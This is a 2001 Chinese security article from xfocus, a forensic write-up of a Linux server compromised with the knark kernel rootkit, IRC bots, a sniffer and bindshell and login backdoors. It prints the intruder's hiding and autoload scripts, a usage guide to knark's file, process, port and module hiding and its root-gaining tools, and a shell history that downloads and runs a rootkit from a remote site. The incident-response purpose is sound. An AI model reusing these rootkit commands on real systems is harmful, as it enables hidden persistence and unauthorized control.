---
title: "入侵分析"
date: 2001-03-14T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-129"
---

(quack_at_xfocus.org)

by quack<quack@xfocus.org>

[http://xfocus.org](http://xfocus.org/)


一、意外


时间：2001-3-11下午

地点：某台RedHat Linux机器：

#uname -a

Linux *.*.cn.net 2.2.5-15 #1 Mon Apr 19 23:00:46 EDT 1999 i686 unknown

俺习惯性地先进到/etc/rc.d/init.d，看了一下，马上发现异状：

#ls -la

……

-rwxr-xr-x   1 root     root         2775 Mar 26  1999 netfs

-rwxr-xr-x   1 root     root         5537 Mar  3 21:23 network

-rwxr-xr-x   1 root     root         2408 Apr 16  1999 nfs

……       


二、初步检查


明显是个新手干的嘛，network文件被人动过了，咱们用stat命令看看先：


#stat network

  File: "network"

  Size: 5537         Filetype: Regular File

  Mode: (0755/-rwxr-xr-x)         Uid: (    0/    root)  Gid: (    0/    root)

Device:  3,1   Inode: 269454    Links: 1

Access: Sun Mar 11 10:59:59 2001(00000.05:53:41)

Modify: Sun Mar  4 05:23:41 2001(00007.11:29:59)

Change: Sun Mar  4 05:23:41 2001(00007.11:29:59)


最后被人改动的时间是3月4号的凌晨。让我们来看看他往文件里加了什么吧：


#cat network

……

/usr/lib/libdd.so.1


就是这么一句，加在文件末尾，看来的确是手段不甚高明。瞧瞧这是个什么文件先


#file /usr/lib/libdd.so.1

/usr/lib/libdd.so.1: ELF 32-bit LSB executable, Intel 80386, version 1, dynamically linked (uses shared libs), not stripped


哦，是个二进制的可执行文件，执行下strings看是否眼熟 :)


#strings /usr/lib/libdd.so.1

/lib/ld-linux.so.2

__gmon_start__

libc.so.6

system

__deregister_frame_info

_IO_stdin_used

__libc_start_main

__register_frame_info

GLIBC_2.0

PTRh

/boot/.pty0/go.sh   <--------这条信息看上去比较有趣


哦，这就简单了嘛，俺看看这里面的路径：


#cd /boot/.pty0

#cat go.sh

#!/bin/bash

f=`ls -al /boot | grep .pty0`

if [ -n "$f" ]; then

cd /boot/.pty0

./mcd -q

cd mech1

./mech -f conf 1>/dev/null 2>/dev/null

cd ..

cd mech2

./mech -f conf 1>/dev/null 2>/dev/null

cd ..

cd mech3

./mech -f conf 1>/dev/null 2>/dev/null

cd ..


/sbin/insmod paraport.o 1>/dev/null 2>/dev/null

/sbin/insmod iBCS.o 1>/dev/null 2>/dev/null

./ascunde.sh

fi

有点晕，看不明白mcd、mech这些东西是干嘛用的，再看一下下一个脚本是什么：

#cat ascunde.sh


#!/bin/bash

for proces in `/bin/cat /boot/.pty0/hdm`; do

P=`/sbin/pidof $proces`

if [ -n "$P" ]; then 

killall -31 $proces 1>/dev/hdm 2>/dev/hdm

fi

done

for port in `/bin/cat /boot/.pty0/hdm1`; do

./nethide `./dec2hex $port` 1>/dev/hdm 2>/dev/hdm

done

for director in `/bin/cat /boot/.pty0/hdm2`; do

./hidef $director 1>/dev/hdm 2>/dev/hdm

done


看到这里，事情开始有趣了，这似乎不是一个三流的script kiddle干的活嘛，打个包拖回来先，于是俺


#cd /boot

#ls -la

total 2265

drwxr-xr-x   3 root     root         1024 Mar 11 03:01 .

drwxr-xr-x  21 root     root         1024 Mar  2 03:37 ..

lrwxrwxrwx   1 root     root           19 Sep 26  1999 System.map -> System.map-2.2.5-15

-rw-r--r--   1 root     root       186704 Apr 20  1999 System.map-2.2.5-15

-rw-r--r--   1 root     root          512 Sep 26  1999 boot.0300

-rw-r--r--   1 root     root         4544 Apr 13  1999 boot.b

-rw-r--r--   1 root     root          612 Apr 13  1999 chain.b

-rw-------   1 root     root         9728 Sep 26  1999 map

lrwxrwxrwx   1 root     root           20 Sep 26  1999 module-info -> module-info-2.2.5-15

-rw-r--r--   1 root     root        11773 Apr 20  1999 module-info-2.2.5-15

-rw-r--r--   1 root     root          620 Apr 13  1999 os2_d.b

-rwxr-xr-x   1 root     root      1469282 Apr 20  1999 vmlinux-2.2.5-15

lrwxrwxrwx   1 root     root           16 Sep 26  1999 vmlinuz -> vmlinuz-2.2.5-15

-rw-r--r--   1 root     root       617288 Apr 20  1999 vmlinuz-2.2.5-15


咦，事情更有趣了……居然没有看到.pty0的目录


#cd .pty0

#ls -laF

total 1228

drwxr-xr-x   3 root     root         1024 Mar 11 03:01 ../

-rwxr-xr-x   1 root     root          345 Mar  3 21:23 ascunde.sh*

-rwxr-xr-x   1 root     root        12760 Mar  3 21:23 dec2hex*

-rwxr-xr-x   1 root     root        13414 Mar  3 21:23 ered*

-rwxr-xr-x   1 root     root          358 Mar  7 19:03 go.sh*

-rwxr-xr-x   1 root     root         3872 Mar  3 21:23 hidef*

-rw-r--r--   1 root     root          956 Mar  3 21:23 iBCS.o

-rw-r--r--   1 root     root       524107 Mar  7 18:40 m.tgz

-rwxr-xr-x   1 root     root       656111 Mar  3 21:23 mcd*

drwxr-xr-x   4 root     root         1024 Mar  7 19:00 mech1/

drwxr-xr-x   4 root     root         1024 Mar  9 19:50 mech2/

drwxr-xr-x   4 root     root         1024 Mar  9 19:20 mech3/

-rwxr-xr-x   1 root     root        12890 Mar  3 21:23 nethide*

-rw-r--r--   1 root     root        10948 Mar  3 21:23 paraport.o

-rw-r--r--   1 root     root          522 Mar  3 21:23 ssh_host_key

-rw-------   1 root     root          512 Mar 11 04:16 ssh_random_seed

-rw-r--r--   1 root     root          677 Mar  3 21:23 sshd_config


看来是加载了某个lkm了，比较讨厌。


#/sbin/lsmod

Module                  Size  Used by

nfsd                  150936   8  (autoclean)

lockd                  30856   1  (autoclean) [nfsd]

sunrpc                 52356   1  (autoclean) [nfsd lockd]

3c59x                  18920   1  (autoclean)


这些是正常的lkm么？前三个模块跟rpc有关，不知开了哪些rpc服务


#/usr/sbin/rpcinfo -p localhost

   program vers proto   port

    100000    2   tcp    111  rpcbind

    100024    1   tcp    664  status

    100011    1   udp    673  rquotad

    100005    3   tcp    695  mountd

    100003    2   udp   2049  nfs

    100021    3   tcp   1024  nlockmgr


原来如此，难怪会被入侵，该开的全开了。不过也证明了nfsd,lockd,sunrpc这三个模块没问题了。

再来看看网卡吧，3c59x是网卡的驱动模块。


#/sbin/ifconfig -a

/sbin/ifconfig -a

lo        Link encap:Local Loopback

          inet addr:127.0.0.1  Bcast:127.255.255.255  Mask:255.0.0.0

          UP LOOPBACK RUNNING  MTU:3924  Metric:1

          RX packets:380640 errors:3374 dropped:0 overruns:0

          TX packets:0 errors:0 dropped:0 overruns:380640


eth0      Link encap:10Mbps Ethernet  HWaddr 00:10:5A:63:5B:05

          inet addr:*.*.*.*  Bcast:*.*.*.255  Mask:255.255.255.0

          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1

          RX packets:71144611 errors:820101 dropped:0 overruns:0

          TX packets:0 errors:0 dropped:0 overruns:436037129

          Interrupt:10 Base address:0xe400


#dmesg|grep eth0

eth0: 3Com 3c905B Cyclone 100baseTx at 0xe400,  00:10:5a:63:5b:05, IRQ 10

eth0: Setting promiscuous mode.

device eth0 entered promiscuous mode


看来这些模块都是正常的，但比较狠的就是――device eth0 entered promiscuous mode――看来这入侵者架了sniffer开听了，但关键是现在这个入侵者加载了个俺看不到的家伙，有些晕了……咦，对了，看看文件名先……


三、模块介绍


nethide？似乎有点印象……好吧，到俺的一堆破烂里找找……咦，找到一篇knark hacking的文章，里面有提到nethide，先当下一个来玩玩吧，有个版本号为knark-0.59的，是对Linux Kernel 2.2的，行……咱们先看看这是什么样的内核模块：


除了taskhack.c之处，所有这些文件都是基于knark.o模块的正确加载。


hidef    用来隐藏你的文件或者目录，你可以建立一个目录，比如/boot/.pty0,然后键入

        ./hidef /boot/.pty0于是这这个目录便被隐藏起来，并且连du之类的命令也不能

    找出它来，同样的，子目录下的任何文件也一样地被藏得天衣无缝 :)


ered    用来重定向执行某个程序，比如说，你把一个bindshell的程序拷到/boot/.pty0/bindshell，

    然后可以用./ered /bin/ls /boot/.pty0/bindshell这样的命令，将ls重定向到bindshell，

    当然，这样的话，ls是没变，但已经不能正确执行了。如果要清除所有的命令重定向，可以

    键入./ered -c


nethide    用来隐藏/proc/net/tcp及/proc/net/udp里的连接进程――netstat就是从这里面获取信息并

    输出的，比如你要隐藏端口43981的连接信息，你必须键入：

    ./nethide ":ABCD "

    你就可以象grep -v一样，过滤掉你不想让人看到的网络连接信息了，比如你用：

    netstat -at

    可能会有一行连接(ssh)的记录是这样的：

    Proto Recv-Q Send-Q Local Address      Foreign Address  State

    tcp        0      0 localhost:ssh      localhost:1023   ESTABLISHED

    我们来看看/proc/net/tcp里面的情况如何:

    cat /proc/net/tcp

    其中相应的行应该是这样的:

      local_address rem_address   blablabla...

    0:0100007F:0016 0100007F:03FF 01 00000000:00000000 00:00000000 00000000

    如果我们想隐藏关于127.0.0.1这个IP地址的所有信息，首先就必须把它“翻译”成这种格式,127用

    十六进制表示是7F，0是00，1是01，于是地址就是0100007F，然后，再跟上端口22是0016，就是：

    0100007F:0016了，于是我们键入：

    ./nethide "0100007F:0016" 便可以将其隐藏得很漂亮了。


rootme    利用这个家伙，你可以不需要suid位，就能拿到root的权限喽:

    ./rootme /bin/sh

    你也可以用这种方式来运行:

    ./rootme /bin/ls -l /root

    这里必须注意，要输入完整的路径名。


taskhack 可以改变运行着的进程的uid,euid,gid,egid等。

    ./taskhack -alluid=0 pid

    这可以把该进程所有的*uid(uid, euid, suid, fsuid)都改成0

    你用：

    ps aux | grep bash

    creed       91  0.0  1.3  1424   824   1 S    15:31   0:00 -bash

    

rexec    远程执行命令，比如：

     ./rexec [www.microsoft.com](http://www.microsoft.com/) haxored.server.nu /bin/touch /LUDER


knark还有一些其它的特性：

将信号31发送给某个进程，能够在/proc里将进程文件隐藏起来，这样ps及top

都无法看到，比如：

#kill -31 pid

如果这个进程还有它的子进程，那么也将一同被隐藏起来，所以如果你把你的shell

隐藏掉的话，所有你键入的进程将都是不可见的。如果你想再看看，被隐藏起来的进

程藏在什么地方的话，可以看/proc/knark/pids文件，这里列出所有隐藏的家伙;)


闯入一个系统中，sniffer总是入侵者们用来扩大战果的玩意儿，现在也存在许多小工具

能够侦测到网卡是否被置于混杂模式，但如果你加载了这个模块，当人们在查询SIOCGIFFLAGS

的标志位时，IFF_PROMISC――接口为随机(promiscuous)模式总是会被隐藏的。


这个包中还带有另一个小工具modhide，这个模块加载后，可以将最后加载至系统中的模块从

模块列表里移除――也就是/proc/module里面看不到它，示例如下：

#/sbin/insmod knark.o

#/sbin/lsmod | grep knark

knark                   6640   0  (unused)

#/sbin/insmod modhide.o

#lsmod | grep knark

啥也没有了 ;)


最重要的是，我们可以在/proc/knark/目录――当然也是隐藏的――下面找到所有被藏起来的东西的资料。


四、分析


我们可以试着看看：


#cd /proc/knark/

#cat files

HIDDEN FILES

/boot/.pty0      

/usr/lib/logem   


这两个目录就是被藏起来的了;)


#cat nethides

HIDDEN STRINGS (without the quotes)

"CB0C"

"17"

":0947"


这里是三个netstat的隐藏。


#cat pids

 EUID PID       COMMAND

    0 112       mcd

    0 338       dittrich


两个后门，一个bindshell，一个是伪装成ssh的，进程都被隐藏了。


#cat redirects

REDIRECT FROM                 REDIRECT TO

/bin/login                    /usr/lib/logem/login2


可执行程序重定向，这里是把login给重定向了。


现在很清楚了，黑客进来之后，首先是上传上/usr/lib/logem下面的文件，包括几个脚本及刚才分析的内核模块，以及几个后门，如login后门，ssh后门，然后修改了/etc/rc.d/init.d/network文件，加上/usr/lib/libdd.so.1行，以便系统启动时自加载，(/etc/inetd.conf里也被加上了一句echo   stream  tcp nowait root  /usr/sbin/echod /usr/sbin/echod，这样入侵者可以远程启动后门及内核模块，这里的echod与libdd.so.1是同样文件)，这个程序指向/boot/.pty0/go.sh：


这里面启动了几个irc的cliend端，连到国外的一些server上挂着――我不太理解为啥老外都这样？我连上去whois了一下,结果如下：


Coitze is ~statd@the.ip.of.the_hacked_machine * Ask your girlfriend :>

Coitze on @#radio21pitesti @#mafiotzii 

Coitze using McLean.VA.US.Undernet.Org CAIS Internet, US

Coitze End of /WHOIS list.


而go.sh又指向ascunde.sh，这里是这样的：


for proces in `/bin/cat /boot/.pty0/hdm`; do <-------hdm文件里有ncd、sh、mcd三行，也就是有这些东西是入侵者想隐藏的

P=`/sbin/pidof $proces`

if [ -n "$P" ]; then 

killall -31 $proces 1>/dev/hdm 2>/dev/hdm <-------发出kill -31的信号，调用加载的内核模块隐藏进程

fi

done

for port in `/bin/cat /boot/.pty0/hdm1`; do  <--------hdm1里是51980及7，入侵者想隐藏的端口

./nethide `./dec2hex $port` 1>/dev/hdm 2>/dev/hdm <------dec2hex是一个小程序，把十进制数据转换成16进制

done

for director in `/bin/cat /boot/.pty0/hdm2`; do <--------hdm2里是/boot/.pty0及/usr/lib/logem

./hidef $director 1>/dev/hdm 2>/dev/hdm  <------调用hidef将hdm2里的文件隐藏

done


基本上就是这样了，我们看看这个洋鬼子在/usr/lib/logem/下面放了些什么东西吧 :)


#ls -la

drwxr-xr-x   4 quack  wheel    512 Mar 12 15:05 ./

drwxr-xr-x  10 quack  wheel   1536 Mar 12 08:44 ../

-rw-r--r--   1 quack  wheel    202 Feb 28 00:46 .bashrc

-rw-r--r--   1 quack  wheel    295 Feb 28 00:46 autoexec

-rwxr-xr-x   1 quack  wheel  14460 Feb 28 00:46 dittrich*

drwxr-xr-x   2 quack  wheel    512 Feb 28 00:46 knrk/

-rwsr-xr-x   1 quack  wheel  20164 Feb 28 00:46 login2*

-rwxr-xr-x   1 quack  wheel  25284 Feb 28 00:46 portmap*

drwxr-xr-x   2 quack  wheel    512 Feb 28 00:46 stuff/


knrk就是咱们刚才分析的内核模块编译过的版本。


#cat autoexec

#!/bin/sh

/sbin/insmod -f /usr/lib/logem/knrk/knrk.o

/sbin/insmod -f /usr/lib/logem/knrk/knrkmodhide.o

/usr/lib/logem/knrk/knrkhidef /usr/lib/logem

/usr/lib/logem/knrk/knrkered /bin/login /usr/lib/logem/login2

/usr/lib/logem/knrk/knrknethide ":0947"

/usr/lib/logem dittrich

killall -31 dittrich


这里dittrich及portmap都是弹出shell的后门，而login2是一个假的login，只是这里这个家伙似乎对ered的理解有些问题，把/bin/login直接重定向到/usr/lib/logem/login2，会导致所有人登陆不上，因为运行login的时候，直接跑去run login2程序了――另外，这台机器没开telnet，root都从控制台登陆的，也不知这个入侵者是什么意思，或许是写了脚本自己入侵的吧。


#cat stuff/conn

# Root Connector (or something)


if ! test $5; then

  echo "Syntax: conn <rewtline>"

  exit 1

fi


REWTIP=$3

REWTPASS=$5


echo "Connecting..."

export DISPLAY=$REWTPASS

telnet $REWTIP

export DISPLAY=0

echo "Disconnected"


这是一个直接登陆到被放置login后门机器的脚本。


五、抓鬼


分析清楚了，还不够，咱得试着逮住这家伙才好呀，反正他的后门已经都知道了，咱们直接运行iplog之类的程序，就可以搞定它了，到[http://download.sourceforge.net/ojnk/iplog-2.2.3.tar.gz](http://download.sourceforge.net/ojnk/iplog-2.2.3.tar.gz)下载iplog的最新版本，需要有libpcap的支持，编译后，借用这家伙的模块，直接kill -31 iplog's_pid，就把iplog进程隐藏了，等他上来吧 ;) 只要逮着连端口7或者51980的，估计都是bad guys :)


六、后话


其实这台机器，俺仔细地看了看，除了上面分析的家伙，至少还有两个人登陆过，而且取得了root权限并安装后门、sniffer等等，从下面可以看出来：


1、/etc/rc.d/rc.local

#!/bin/sh


# This script will be executed *after* all the other init scripts.

# You can put your own initialization stuff in here if you don't

# want to do the full Sys V style init stuff.

/bin/bd                      <--------------这里是一个bindshell的后门


if [ -f /etc/redhat-release ]; then

    R=$(cat /etc/redhat-release)


    arch=$(uname -m)

    a="a"

    case "_$arch" in

            _a*) a="an";;

            _i*) a="an";;

    esac


    /usr/bin/bsgd            <--------------另一个bindshell后门

    # This will overwrite /etc/issue at every boot.  So, make any changes you

    # want to make to /etc/issue here or you will lose them when you reboot.

    echo "" > /etc/issue

    echo "$R" >> /etc/issue

    echo "Kernel $(uname -r) on $a $(uname -m)" >> /etc/issue

    /usr/bin/hyme            <---------------一个很常见的linux下的sniffer，该入侵者修改过程序


    cp -f /etc/issue /etc/issue.net

    echo >> /etc/issue

fi


2、/.bash_history


#cat /.bash_history

mkdir /usr/src/.puta

cd /usr/src/.puta

lynx -dump [http://www.angelfire.com/linux/tools/bkS.tgz](http://www.angelfire.com/linux/tools/bkS.tgz) > bkS.tgz

tar -zxvf bkS.tgz

cd bk ;./b0skit

cat /etc/inetd.conf | grep -v 4512 > /tmp/back

mv -f /tmp/back /etc/inetd.conf

killall -1 inetd


其实作为系统管理员，只要付出1%的努力，就可以让99%的入侵者束手无策，但是满世界却偏偏总有着无数的机器，愿意Free地让入侵者们使用――或者删除……
